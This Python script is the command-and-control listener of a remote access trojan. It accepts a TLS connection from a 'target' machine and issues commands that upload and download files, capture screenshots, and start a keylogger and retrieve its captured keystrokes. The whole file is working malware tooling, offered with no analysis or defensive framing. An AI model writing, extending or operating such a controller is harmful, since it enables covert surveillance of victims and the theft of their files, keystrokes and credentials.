#!/usr/bin/env python

import socket
import ssl
import json
import base64

HOST = "192.168.1.103"
PORT = 8080
log_started = False


def receive_data():
    data = b""
    while True:
        part = conn.recv(1024)
        data += part
        if len(part) < 1024:
            break
    return json.loads(data)


def write_file(path, filedata):
    with open(path, "wb") as file:
        file.write(base64.b64decode(filedata))
        return "[+] Download successful"


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def send(data):
    json_data = json.dumps(data)
    conn.send(json_data.encode())


def command_execution(command):
    send(command)
    if command[0] == "quit":
        wrapS.close()
        print("[+] Connection closed")
        exit()
    return receive_data()


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    wrapS = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, server_side=True,
                            keyfile="/home/caius/key_and_cert_files/key.pem",
                            certfile="/home/caius/key_and_cert_files/cert.pem")
    wrapS.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    wrapS.bind((HOST, PORT))
    wrapS.settimeout(None)
    wrapS.listen()
    print("[+] Listening for connections")
    conn, addr = wrapS.accept()
    ping = receive_data()
    if ping == "Ping":
        send("Pong")
        print("[+] Connection established with target ", addr)

    while True:
        command = input(">> ")
        command = command.split(" ")
        try:
            if command[0] == "upload":
                file_data = read_file(command[1])
                command.append(file_data.decode("utf-8", "ignore"))

            data = command_execution(command)

            if command[0] == "download" and "[+] Error" not in data:
                if len(command) > 2:
                    data = write_file(command[2], data)
                else:
                    data = write_file(command[1], data)

            if command[0] == "screenshot" and "[+] Error" not in data:
                if len(command) > 1:
                    data = write_file(command[1], data)
                    print("[+] Screenshot taken")
                else:
                    data = write_file("screenshot.png", data)
                    print("[+] Default location used. Please use screenshot (path) unless you want your "
                          "screenshot overwritten")

            if command[0] == "keylogger":
                if command[1] == "download" and log_started and "Error" not in data:
                    data = write_file("keylogdata.txt", data)
                    print("Keylog file downloaded.")
                if command[1] == "start":
                    if data == "[+] Keylogger started (manual logging)":
                        log_started = True
        except Exception:
            data = "[+] Error"

        print(data)
